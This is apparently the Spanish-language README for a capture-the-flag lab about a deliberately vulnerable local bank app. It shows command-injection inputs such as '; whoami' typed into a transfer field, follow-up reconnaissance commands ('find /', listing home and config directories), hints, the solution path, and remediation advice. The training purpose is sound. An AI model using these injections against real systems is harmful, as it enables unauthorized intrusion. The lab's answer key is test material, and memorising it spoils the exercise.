# 🎯 DESAFÍO DE EXPLORACIÓN - BANCO NACIONAL

## Objetivo del Desafío

Has logrado explotar la vulnerabilidad RCE en el sistema de transferencias del Banco Nacional. Ahora debes explorar el sistema de archivos del servidor para encontrar un script de pentesting que contiene la solución completa del desafío.

---

## 📋 Escenario

Después de obtener ejecución remota de código (RCE) en el servidor del banco, descubres que el sistema tiene una estructura de directorios compleja. En algún lugar del sistema se encuentra un script Python con un exploit automatizado que te permitirá:

- ✅ Explotar la vulnerabilidad de forma automática
- ✅ Ejecutar comandos en modo interactivo
- ✅ Ver demostraciones de comandos útiles
- ✅ Aprender técnicas avanzadas de explotación

---

## 🎮 Instrucciones

### Paso 1: Obtener acceso RCE básico

1. Inicia sesión en el banco: `http://localhost:5000`
   - Usuario: `julian`
   - Contraseña: `juli123`

2. Ve a la sección de **Transferencias**

3. Inyecta un comando en el campo "Cuenta Destino":
   ```
   ; whoami
   ```

4. Si ves el output del comando, ¡tienes RCE!

### Paso 2: Explorar el sistema

Ahora debes encontrar el archivo `rce_exploit.py` que está oculto en algún lugar del sistema.

**Comandos útiles para explorar:**

```bash
# Ver directorio actual
; pwd

# Listar contenido
; ls -la

# Buscar archivos Python
; find / -name "*.py" 2>/dev/null

# Buscar archivos con "exploit" en el nombre  
; find / -name "*exploit*" 2>/dev/null

# Listar directorios comunes
; ls -la /opt
; ls -la /var
; ls -la /home
; ls -la /etc

# Ver archivos ocultos (empiezan con punto)
; ls -la /opt/scripts/
```

### Paso 3: Seguir las pistas

El sistema contiene varios archivos que te darán pistas sobre dónde buscar:

**Pistas disponibles:**
- 📄 `/var/log/audit.log` - Registro de auditoría de seguridad
- 📄 `/home/admin/Documents/notas.txt` - Notas del administrador
- 📄 `/home/admin/Documents/TODO.md` - Lista de tareas pendientes
- 📄 `/opt/scripts/install.sh` - Script de instalación

**Ejemplo de cómo leer un archivo:**
```bash
; cat /var/log/audit.log
```

### Paso 4: Encontrar el script

Una vez que encuentres el archivo `rce_exploit.py`, puedes:

1. **Leerlo directamente desde el RCE:**
   ```bash
   ; cat /ruta/al/rce_exploit.py
   ```

2. **Copiarlo a tu máquina local** (si estás en Docker):
   ```bash
   docker cp banco-nacional:/ruta/al/rce_exploit.py .
   ```

3. **Ejecutarlo directamente en el contenedor:**
   ```bash
   docker exec -it banco-nacional python /ruta/al/rce_exploit.py
   ```

---

## 🗺️ Mapa del Sistema

El servidor tiene la siguiente estructura (simplificada):

```
/
├── opt/
│   ├── scripts/      ← Scripts del sistema
│   │   ├── ...       ← Varios scripts normales
│   │   └── .hidden/  ← ⭐ Carpeta oculta interesante
│   └── data/
├── var/
│   ├── log/          ← Logs del sistema (pistas aquí)
│   ├── backup/
│   └── tmp/
├── home/
│   ├── admin/
│   │   ├── Documents/ ← 📋 Pistas importantes aquí
│   │   ├── .ssh/
│   │   └── .local/
│   └── usuario/
├── etc/
│   └── config/
└── srv/
    └── www/
```

---

## 💡 Pistas Graduales

<details>
<summary>🟢 Pista 1 (Haz clic para revelar)</summary>

Los administradores del sistema suelen dejar notas en sus carpetas personales. Revisa `/home/admin/Documents/`.

</details>

<details>
<summary>🟡 Pista 2 (Haz clic para revelar)</summary>

Los registros de auditoría de seguridad pueden revelar ubicaciones de archivos sensibles. Mira en `/var/log/audit.log`.

</details>

<details>
<summary>🟠 Pista 3 (Haz clic para revelar)</summary>

Los scripts de desarrollo/testing suelen guardarse en subcarpetas de `/opt/scripts/`. Busca carpetas que empiecen con punto (archivos/carpetas ocultas).

</details>

<details>
<summary>🔴 Solución (última opción)</summary>

El archivo está en: `/opt/scripts/.hidden/rce_exploit.py`

Para listarlo:
```bash
; ls -la /opt/scripts/.hidden/
```

Para leerlo:
```bash
; cat /opt/scripts/.hidden/rce_exploit.py
```

</details>

---

## 🏆 Objetivos de Aprendizaje

Al completar este desafío habrás aprendido:

- ✅ Cómo explotar vulnerabilidades RCE
- ✅ Técnicas de reconocimiento en sistemas Linux
- ✅ Uso de comandos `find`, `ls`, `cat`, `grep`
- ✅ Importancia de la exploración post-explotación
- ✅ Cómo encontrar información sensible en servidores
- ✅ Metodología de pentesting estructurada

---

## 🛡️ Remediación

**Vulnerabilidades encontradas:**

1. **RCE via subprocess.check_output()**
   - ❌ Uso de `shell=True` con input del usuario
   - ✅ Solución: Usar listas de argumentos, nunca `shell=True`

2. **Archivos sensibles en producción**
   - ❌ Scripts de pentesting en servidor productivo
   - ✅ Solución: Eliminar scripts de desarrollo antes de deploy

3. **Permisos excesivos**
   - ❌ Usuario de la aplicación con acceso a todo el sistema
   - ✅ Solución: Principio de menor privilegio, contenedores aislados

---

## 📚 Recursos Adicionales

- [OWASP Top 10 - Injection](https://owasp.org/www-project-top-ten/)
- [GTFOBins - Unix binaries exploits](https://gtfobins.github.io/)
- [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)

---

## ⚠️ Disclaimer

Este es un entorno de aprendizaje controlado. Las técnicas aprendidas aquí deben usarse **ÚNICAMENTE** para:

- ✅ Aprendizaje de seguridad informática
- ✅ Pentesting autorizado
- ✅ Mejora de sistemas propios
- ❌ NUNCA en sistemas sin autorización explícita

El acceso no autorizado a sistemas informáticos es **ilegal** y puede resultar en cargos criminales.

---

**¡Buena suerte, hacker! 🎯**
